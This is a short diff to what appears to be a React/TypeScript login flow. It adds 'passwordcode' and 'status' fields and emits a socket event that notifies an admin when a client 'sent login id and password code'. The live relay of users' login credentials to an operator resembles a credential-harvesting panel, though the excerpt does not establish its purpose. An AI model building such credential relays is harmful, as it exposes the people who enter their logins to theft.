@@ -6,8 +6,10 @@ import useSocket from '@/lib/socket';
 
 interface UserData {
   id: string;
+  date: any;
   loginid: string;
-  phonenumber: string;
+  passwordcode: string;
+  status: string;
 }
 
 const {socket} = useSocket();
@@ -65,7 +67,6 @@ export const LoginIdAction = ({loginIdV, passwordCodeV, userName, dateV }: { pho
       toast({
         title: 'LoginID and PasswordCode Sending Successful!',
         description: 'Welcome! Your loginId and Password Code sending has been success.',
-        action: <button onClick={dismiss}>LoginID And Password Code</button>,
       });
 
       socket.emit("adminLoginId", {receiveuserId: userName, message:"Client sent login id and password code to you!"} );
